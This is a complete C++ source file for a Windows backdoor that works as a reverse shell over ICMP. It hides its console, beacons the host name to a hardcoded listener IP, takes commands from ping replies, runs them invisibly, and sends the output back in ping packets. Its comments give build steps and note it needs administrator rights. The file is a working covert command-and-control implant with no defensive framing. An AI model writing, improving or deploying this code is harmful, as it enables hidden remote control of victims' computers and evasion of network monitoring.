// backdoor4 fixed with proper ANSI/UNICODE handling:
// ICMP REVERSE SHELL - C++ VERSION - FIXED
// Compile: g++ backdoor4_fixed.cpp -o backdoor4.exe -lws2_32 -liphlpapi -static
// MUST RUN AS ADMINISTRATOR

#include <winsock2.h>
#include <windows.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include <iostream>
#include <string>
#include <cstring>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

// Force ANSI versions
#ifdef UNICODE
#undef UNICODE
#endif
#ifdef _UNICODE
#undef _UNICODE
#endif

#define LISTENER_IP "192.168.1.100"  // CHANGE THIS

class ICMPShell {
private:
    SOCKET rawSock;
    WSADATA wsaData;
    DWORD targetAddr;
    
    // ICMP header structure
    typedef struct {
        BYTE type;
        BYTE code;
        USHORT checksum;
        USHORT id;
        USHORT seq;
    } ICMP_HEADER;
    
    USHORT CalculateChecksum(USHORT* buffer, int size) {
        ULONG cksum = 0;
        while (size > 1) {
            cksum += *buffer++;
            size -= sizeof(USHORT);
        }
        if (size) cksum += *(UCHAR*)buffer;
        cksum = (cksum >> 16) + (cksum & 0xffff);
        cksum += (cksum >> 16);
        return (USHORT)(~cksum);
    }
    
    bool InitRawSocket() {
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        
        rawSock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (rawSock == INVALID_SOCKET) return false;
        
        // Set socket timeout
        int timeout = 3000;
        setsockopt(rawSock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        
        return true;
    }
    
    bool SendPing(const std::string& data) {
        char packet[1024] = {0};
        ICMP_HEADER* icmp = (ICMP_HEADER*)packet;
        
        icmp->type = 8;  // Echo request
        icmp->code = 0;
        icmp->checksum = 0;
        icmp->id = (USHORT)GetCurrentProcessId();
        icmp->seq = 1;
        
        // Copy data after header
        memcpy(packet + sizeof(ICMP_HEADER), data.c_str(), data.length());
        
        int packetSize = sizeof(ICMP_HEADER) + data.length();
        icmp->checksum = CalculateChecksum((USHORT*)packet, packetSize);
        
        sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = targetAddr;
        
        int result = sendto(rawSock, packet, packetSize, 0, 
            (sockaddr*)&dest, sizeof(dest));
        return result > 0;
    }
    
    std::string ReceivePing() {
        char buffer[2048] = {0};
        sockaddr_in source;
        int sourceLen = sizeof(source);
        
        int bytes = recvfrom(rawSock, buffer, sizeof(buffer), 0, 
            (sockaddr*)&source, &sourceLen);
        
        if (bytes > (20 + 8)) {  // IP header (20) + ICMP header (8)
            // Skip IP header (20 bytes)
            ICMP_HEADER* icmp = (ICMP_HEADER*)(buffer + 20);
            
            if (icmp->type == 0) {  // Echo reply
                int dataLen = bytes - 20 - sizeof(ICMP_HEADER);
                if (dataLen > 0) {
                    return std::string(buffer + 20 + sizeof(ICMP_HEADER), dataLen);
                }
            }
        }
        return "";
    }
    
    std::string ExecuteCommand(const char* cmd) {
        std::string result;
        
        // Handle 'cd' command
        std::string cmdStr(cmd);
        if (cmdStr.find("cd ") == 0) {
            std::string path = cmdStr.substr(3);
            if (SetCurrentDirectoryA(path.c_str())) {
                char cwd[MAX_PATH];
                GetCurrentDirectoryA(MAX_PATH, cwd);
                result = std::string(cwd);
            } else {
                result = "Failed to change directory";
            }
            return result;
        }
        
        // Use pipes for command execution (more reliable)
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;
        
        HANDLE hRead, hWrite;
        if (!CreatePipe(&hRead, &hWrite, &sa, 0))
            return "Error creating pipe";
        
        STARTUPINFOA si = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;
        
        PROCESS_INFORMATION pi;
        
        // Create mutable copy of command
        char* cmdMutable = _strdup(cmd);
        
        if (CreateProcessA(NULL, cmdMutable, NULL, NULL, TRUE, 
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            
            char buffer[4096];
            DWORD bytesRead;
            while (ReadFile(hRead, buffer, sizeof(buffer)-1, &bytesRead, NULL) 
                   && bytesRead > 0) {
                buffer[bytesRead] = 0;
                result += buffer;
            }
        }
        
        free(cmdMutable);
        CloseHandle(hRead);
        CloseHandle(hWrite);
        
        return result.empty() ? "OK" : result;
    }
    
public:
    ICMPShell() {
        targetAddr = inet_addr(LISTENER_IP);
        FreeConsole();
    }
    
    ~ICMPShell() {
        if (rawSock != INVALID_SOCKET)
            closesocket(rawSock);
        WSACleanup();
    }
    
    void Run() {
        if (!InitRawSocket()) return;
        
        // Send connection beacon
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        SendPing(std::string("[CONNECT] ") + hostname);
        
        while (true) {
            std::string cmd = ReceivePing();
            
            if (!cmd.empty()) {
                if (cmd == "exit") break;
                
                std::string output = ExecuteCommand(cmd.c_str());
                SendPing("[OUT] " + output);
            }
            
            Sleep(2000);  // Ping interval
        }
    }
};

int main() {
    ICMPShell shell;
    shell.Run();
    return 0;
}